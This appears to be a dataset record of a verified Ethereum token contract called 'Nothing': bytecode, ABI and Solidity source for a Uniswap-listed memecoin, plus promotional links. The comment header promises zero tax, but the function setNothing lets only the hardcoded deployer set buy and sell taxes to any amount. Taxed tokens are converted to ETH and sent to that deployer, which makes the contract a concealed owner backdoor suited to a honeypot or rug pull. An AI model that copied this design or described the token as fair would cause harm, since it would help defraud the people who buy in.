{
    "address": "0x48df68e006d857d29C39030D2c3B1E0CBF5c6bf4",
    "tx_hash": "f36aabd434913a75293b2d35aeb54d0fc52cc1c185e4c95ee76edf0a41575feb",
    "block_number": 18004175,
    "timestamp": 1693117223,
    "gas_used_in_creation": 3266990,
    "creation_bytecode": "60a0604052600060028190556003556004805460ff191690553480156200002557600080fd5b50737a250d5630b4cf539739df2c5dacb4c659f2488d6001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa15801562000079573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906200009f9190620001e8565b6040516364e329cb60e11b815230600482015273c02aaa39b223fe8d0a0e5c4f27ead9083c756cc260248201526001600160a01b03919091169063c9c65396906044016020604051808303816000875af115801562000102573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620001289190620001e8565b6001600160a01b0316608052620001426009600a6200032f565b62000152906305f5e10062000340565b336000818152602081815260408083209490945530825260018152838220737a250d5630b4cf539739df2c5dacb4c659f2488d835290529182206000199055907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef620001c16009600a6200032f565b620001d1906305f5e10062000340565b60405190815260200160405180910390a36200035a565b600060208284031215620001fb57600080fd5b81516001600160a01b03811681146200021357600080fd5b9392505050565b634e487b7160e01b600052601160045260246000fd5b600181815b80851115620002715781600019048211156200025557620002556200021a565b808516156200026357918102915b93841c939080029062000235565b509250929050565b6000826200028a5750600162000329565b81620002995750600062000329565b8160018114620002b25760028114620002bd57620002dd565b600191505062000329565b60ff841115620002d157620002d16200021a565b50506001821b62000329565b5060208310610133831016604e8410600b841016171562000302575081810a62000329565b6200030e838362000230565b80600019048211156200032557620003256200021a565b0290505b92915050565b60006200021360ff84168362000279565b80820281158282048414176200032957620003296200021a565b608051610be1620003846000396000818161040b015281816104cf01526107280152610be16000f3fe6080604052600436106100a05760003560e01c8063313ce56711610064578063313ce5671461018a57806370a08231146101b157806395d89b41146100ac578063a9059cbb146101de578063c9567bf9146101fe578063dd62ed3e1461021357600080fd5b806306fdde03146100ac578063095ea7b3146100f55780630fd8a9111461012557806318160ddd1461014757806323b872dd1461016a57600080fd5b366100a757005b600080fd5b3480156100b857600080fd5b506100df604051806040016040528060078152602001664e6f7468696e6760c81b81525081565b6040516100ec919061087c565b60405180910390f35b34801561010157600080fd5b506101156101103660046108e6565b61024b565b60405190151581526020016100ec565b34801561013157600080fd5b50610145610140366004610910565b6102b8565b005b34801561015357600080fd5b5061015c6102f9565b6040519081526020016100ec565b34801561017657600080fd5b50610115610185366004610932565b610316565b34801561019657600080fd5b5061019f600981565b60405160ff90911681526020016100ec565b3480156101bd57600080fd5b5061015c6101cc36600461096e565b60006020819052908152604090205481565b3480156101ea57600080fd5b506101156101f93660046108e6565b610364565b34801561020a57600080fd5b50610145610378565b34801561021f57600080fd5b5061015c61022e366004610989565b600160209081526000928352604080842090915290825290205481565b3360008181526001602090815260408083206001600160a01b038716808552925280832085905551919290917f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925906102a69086815260200190565b60405180910390a35060015b92915050565b7332755345a47ccede41b29ec680e89640ded417631933016102df57600291909155600355565b600a82106102ec57600080fd5b600a81106100a757600080fd5b6103056009600a610ab6565b610313906305f5e100610ac5565b81565b6001600160a01b038316600090815260016020908152604080832033845290915281208054839190839061034b908490610adc565b9091555061035c90508484846103a7565b949350505050565b60006103713384846103a7565b9392505050565b337332755345a47ccede41b29ec680e89640ded417641461039857600080fd5b6004805460ff19166001179055565b6001600160a01b0383166000908152602081905260408120805483919083906103d1908490610adc565b90915550506001600160a01b0384167332755345a47ccede41b29ec680e89640ded41764146104095760045460ff1661040957600080fd5b7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316836001600160a01b03161415801561046857506001600160a01b0383167332755345a47ccede41b29ec680e89640ded4176414155b156104cd57606461047b6009600a610ab6565b610489906305f5e100610ac5565b610494906064610ac5565b61049e9190610aef565b6001600160a01b0384166000908152602081905260409020546104c2908490610b11565b11156104cd57600080fd5b7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316836001600160a01b03161480156105165750600454610100900460ff16155b801561055757506103e861052c6009600a610ab6565b61053a906305f5e100610ac5565b6105449190610aef565b3060009081526020819052604090205410155b156106e7576004805461ff00191661010017905560408051600280825260608201835260009260208301908036833701905050905030816000815181106105a0576105a0610b24565b60200260200101906001600160a01b031690816001600160a01b03168152505073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2816001815181106105e8576105e8610b24565b6001600160a01b0390921660209283029190910190910152737a250d5630b4cf539739df2c5dacb4c659f2488d63791ac9476103e86106296009600a610ab6565b610637906305f5e100610ac5565b6106419190610aef565b60008430426040518663ffffffff1660e01b8152600401610666959493929190610b3a565b600060405180830381600087803b15801561068057600080fd5b505af1158015610694573d6000803e3d6000fd5b50506040517332755345a47ccede41b29ec680e89640ded4176492504780156108fc029250906000818181858888f193505050501580156106d9573d6000803e3d6000fd5b50506004805461ff00191690555b6001600160a01b038416301480159061071d57506001600160a01b0383167332755345a47ccede41b29ec680e89640ded4176414155b156107f657600060647f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316866001600160a01b0316146107675760035461076b565b6002545b6107759085610ac5565b61077f9190610aef565b905061078b8184610adc565b306000908152602081905260408120805492955083929091906107af908490610b11565b909155505060405181815230906001600160a01b038716907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a3505b6001600160a01b0383166000908152602081905260408120805484929061081e908490610b11565b92505081905550826001600160a01b0316846001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8460405161086a91815260200190565b60405180910390a35060019392505050565b600060208083528351808285015260005b818110156108a95785810183015185820160400152820161088d565b506000604082860101526040601f19601f8301168501019250505092915050565b80356001600160a01b03811681146108e157600080fd5b919050565b600080604083850312156108f957600080fd5b610902836108ca565b946020939093013593505050565b6000806040838503121561092357600080fd5b50508035926020909101359150565b60008060006060848603121561094757600080fd5b610950846108ca565b925061095e602085016108ca565b9150604084013590509250925092565b60006020828403121561098057600080fd5b610371826108ca565b6000806040838503121561099c57600080fd5b6109a5836108ca565b91506109b3602084016108ca565b90509250929050565b634e487b7160e01b600052601160045260246000fd5b600181815b80851115610a0d5781600019048211156109f3576109f36109bc565b80851615610a0057918102915b93841c93908002906109d7565b509250929050565b600082610a24575060016102b2565b81610a31575060006102b2565b8160018114610a475760028114610a5157610a6d565b60019150506102b2565b60ff841115610a6257610a626109bc565b50506001821b6102b2565b5060208310610133831016604e8410600b8410161715610a90575081810a6102b2565b610a9a83836109d2565b8060001904821115610aae57610aae6109bc565b029392505050565b600061037160ff841683610a15565b80820281158282048414176102b2576102b26109bc565b818103818111156102b2576102b26109bc565b600082610b0c57634e487b7160e01b600052601260045260246000fd5b500490565b808201808211156102b2576102b26109bc565b634e487b7160e01b600052603260045260246000fd5b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b81811015610b8a5784516001600160a01b031683529383019391830191600101610b65565b50506001600160a01b0396909616606085015250505060800152939250505056fea2646970667358221220689889e427fde33f792d78cdfaaeb98bffa847b68c40a18999f6e783c088f0f464736f6c63430008120033",
    "runtime_bytecode": "6080604052600436106100a05760003560e01c8063313ce56711610064578063313ce5671461018a57806370a08231146101b157806395d89b41146100ac578063a9059cbb146101de578063c9567bf9146101fe578063dd62ed3e1461021357600080fd5b806306fdde03146100ac578063095ea7b3146100f55780630fd8a9111461012557806318160ddd1461014757806323b872dd1461016a57600080fd5b366100a757005b600080fd5b3480156100b857600080fd5b506100df604051806040016040528060078152602001664e6f7468696e6760c81b81525081565b6040516100ec919061087c565b60405180910390f35b34801561010157600080fd5b506101156101103660046108e6565b61024b565b60405190151581526020016100ec565b34801561013157600080fd5b50610145610140366004610910565b6102b8565b005b34801561015357600080fd5b5061015c6102f9565b6040519081526020016100ec565b34801561017657600080fd5b50610115610185366004610932565b610316565b34801561019657600080fd5b5061019f600981565b60405160ff90911681526020016100ec565b3480156101bd57600080fd5b5061015c6101cc36600461096e565b60006020819052908152604090205481565b3480156101ea57600080fd5b506101156101f93660046108e6565b610364565b34801561020a57600080fd5b50610145610378565b34801561021f57600080fd5b5061015c61022e366004610989565b600160209081526000928352604080842090915290825290205481565b3360008181526001602090815260408083206001600160a01b038716808552925280832085905551919290917f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925906102a69086815260200190565b60405180910390a35060015b92915050565b7332755345a47ccede41b29ec680e89640ded417631933016102df57600291909155600355565b600a82106102ec57600080fd5b600a81106100a757600080fd5b6103056009600a610ab6565b610313906305f5e100610ac5565b81565b6001600160a01b038316600090815260016020908152604080832033845290915281208054839190839061034b908490610adc565b9091555061035c90508484846103a7565b949350505050565b60006103713384846103a7565b9392505050565b337332755345a47ccede41b29ec680e89640ded417641461039857600080fd5b6004805460ff19166001179055565b6001600160a01b0383166000908152602081905260408120805483919083906103d1908490610adc565b90915550506001600160a01b0384167332755345a47ccede41b29ec680e89640ded41764146104095760045460ff1661040957600080fd5b7f0000000000000000000000008fd120b6b6315abe49a9908c01a9ab68e0c6c9626001600160a01b0316836001600160a01b03161415801561046857506001600160a01b0383167332755345a47ccede41b29ec680e89640ded4176414155b156104cd57606461047b6009600a610ab6565b610489906305f5e100610ac5565b610494906064610ac5565b61049e9190610aef565b6001600160a01b0384166000908152602081905260409020546104c2908490610b11565b11156104cd57600080fd5b7f0000000000000000000000008fd120b6b6315abe49a9908c01a9ab68e0c6c9626001600160a01b0316836001600160a01b03161480156105165750600454610100900460ff16155b801561055757506103e861052c6009600a610ab6565b61053a906305f5e100610ac5565b6105449190610aef565b3060009081526020819052604090205410155b156106e7576004805461ff00191661010017905560408051600280825260608201835260009260208301908036833701905050905030816000815181106105a0576105a0610b24565b60200260200101906001600160a01b031690816001600160a01b03168152505073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2816001815181106105e8576105e8610b24565b6001600160a01b0390921660209283029190910190910152737a250d5630b4cf539739df2c5dacb4c659f2488d63791ac9476103e86106296009600a610ab6565b610637906305f5e100610ac5565b6106419190610aef565b60008430426040518663ffffffff1660e01b8152600401610666959493929190610b3a565b600060405180830381600087803b15801561068057600080fd5b505af1158015610694573d6000803e3d6000fd5b50506040517332755345a47ccede41b29ec680e89640ded4176492504780156108fc029250906000818181858888f193505050501580156106d9573d6000803e3d6000fd5b50506004805461ff00191690555b6001600160a01b038416301480159061071d57506001600160a01b0383167332755345a47ccede41b29ec680e89640ded4176414155b156107f657600060647f0000000000000000000000008fd120b6b6315abe49a9908c01a9ab68e0c6c9626001600160a01b0316866001600160a01b0316146107675760035461076b565b6002545b6107759085610ac5565b61077f9190610aef565b905061078b8184610adc565b306000908152602081905260408120805492955083929091906107af908490610b11565b909155505060405181815230906001600160a01b038716907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a3505b6001600160a01b0383166000908152602081905260408120805484929061081e908490610b11565b92505081905550826001600160a01b0316846001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8460405161086a91815260200190565b60405180910390a35060019392505050565b600060208083528351808285015260005b818110156108a95785810183015185820160400152820161088d565b506000604082860101526040601f19601f8301168501019250505092915050565b80356001600160a01b03811681146108e157600080fd5b919050565b600080604083850312156108f957600080fd5b610902836108ca565b946020939093013593505050565b6000806040838503121561092357600080fd5b50508035926020909101359150565b60008060006060848603121561094757600080fd5b610950846108ca565b925061095e602085016108ca565b9150604084013590509250925092565b60006020828403121561098057600080fd5b610371826108ca565b6000806040838503121561099c57600080fd5b6109a5836108ca565b91506109b3602084016108ca565b90509250929050565b634e487b7160e01b600052601160045260246000fd5b600181815b80851115610a0d5781600019048211156109f3576109f36109bc565b80851615610a0057918102915b93841c93908002906109d7565b509250929050565b600082610a24575060016102b2565b81610a31575060006102b2565b8160018114610a475760028114610a5157610a6d565b60019150506102b2565b60ff841115610a6257610a626109bc565b50506001821b6102b2565b5060208310610133831016604e8410600b8410161715610a90575081810a6102b2565b610a9a83836109d2565b8060001904821115610aae57610aae6109bc565b029392505050565b600061037160ff841683610a15565b80820281158282048414176102b2576102b26109bc565b818103818111156102b2576102b26109bc565b600082610b0c57634e487b7160e01b600052601260045260246000fd5b500490565b808201808211156102b2576102b26109bc565b634e487b7160e01b600052603260045260246000fd5b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b81811015610b8a5784516001600160a01b031683529383019391830191600101610b65565b50506001600160a01b0396909616606085015250505060800152939250505056fea2646970667358221220689889e427fde33f792d78cdfaaeb98bffa847b68c40a18999f6e783c088f0f464736f6c63430008120033",
    "contract_name": "Nothing",
    "compiler_version": "v0.8.18+commit.87f61d96",
    "optimization_used": "1",
    "runs": "200",
    "abi": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newBuyTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newSellTax\",\"type\":\"uint256\"}],\"name\":\"setNothing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
    "source_code": "/**\r\n\r\nNothing is a white square nft (square) that has been put into a vault, that has then been put locked into a memecoin contract (can never be withdrawn or sold) that is split into 1 million pieces. It's essentially a white square nft divided into a bunch of tiny pieces\u2026 aka supercharged hot digital air.\r\n\r\nCan you find and type the correct code word on the website?\r\n\r\n100m $Nothing: 0 TAX\r\n\r\nTelegram: https://t.me/NothingTokenTG\r\nTwitter: https://twitter.com/NothingTokenERC\r\nWebsite: https://nothingtoken.site\r\nMedium: https://medium.com/@nothing-erc20\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: unlicense\r\n\r\npragma solidity =0.8.18;\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n\r\n}\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n \r\ncontract Nothing {\r\n    mapping (address => uint256) public balanceOf;\r\n    mapping (address => mapping (address => uint256)) public allowance;\r\n\r\n    string public constant name = \"Nothing\";   \r\n    string public constant symbol = \"Nothing\";   \r\n    uint8 public constant decimals = 9;\r\n    uint256 public constant totalSupply = 100_000_000 * 10**decimals;\r\n\r\n    uint256 buyTax = 0;\r\n    uint256 sellTax = 0;\r\n    uint256 constant swapAmount = totalSupply / 1000;\r\n    uint256 constant maxWallet = 100 * totalSupply / 100;\r\n\r\n    bool tradingOpened = false;\r\n    bool swapping;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n\r\n    address immutable pair;\r\n    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);\r\n    address payable constant deployer = payable(address(0x32755345A47cCeDE41B29Ec680E89640DEd41764));\r\n\r\n    constructor() {\r\n        pair = IUniswapV2Factory(_uniswapV2Router.factory())\r\n            .createPair(address(this), ETH);\r\n        balanceOf[msg.sender] = totalSupply;\r\n        allowance[address(this)][routerAddress] = type(uint256).max;\r\n        emit Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool){\r\n        allowance[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) external returns (bool){\r\n        return _transfer(msg.sender, to, amount);\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool){\r\n        allowance[from][msg.sender] -= amount;        \r\n        return _transfer(from, to, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) internal returns (bool){\r\n        balanceOf[from] -= amount;\r\n\r\n        if(from != deployer)\r\n            require(tradingOpened);\r\n\r\n        if(to != pair && to != deployer)\r\n            require(balanceOf[to] + amount <= maxWallet);\r\n\r\n        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){\r\n            swapping = true;\r\n            address[] memory path = new  address[](2);\r\n            path[0] = address(this);\r\n            path[1] = ETH;\r\n            _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n                swapAmount,\r\n                0,\r\n                path,\r\n                address(this),\r\n                block.timestamp\r\n            );\r\n            deployer.transfer(address(this).balance);\r\n            swapping = false;\r\n        }\r\n\r\n        if(from != address(this) && to != deployer){\r\n            uint256 taxAmount = amount * (from == pair ? buyTax : sellTax) / 100;\r\n            amount -= taxAmount;\r\n            balanceOf[address(this)] += taxAmount;\r\n            emit Transfer(from, address(this), taxAmount);\r\n        }\r\n        balanceOf[to] += amount;\r\n        emit Transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function openTrading() external {\r\n        require(msg.sender == deployer);\r\n        tradingOpened = true;\r\n    }\r\n\r\n    function setNothing(uint256 newBuyTax, uint256 newSellTax) external {\r\n        if(msg.sender == deployer){\r\n            buyTax = newBuyTax;\r\n            sellTax = newSellTax;\r\n        }\r\n        else{\r\n            require(newBuyTax < 10);\r\n            require(newSellTax < 10);\r\n            revert();\r\n        }\r\n        \r\n    }\r\n}",
    "etherscan_verified": true
}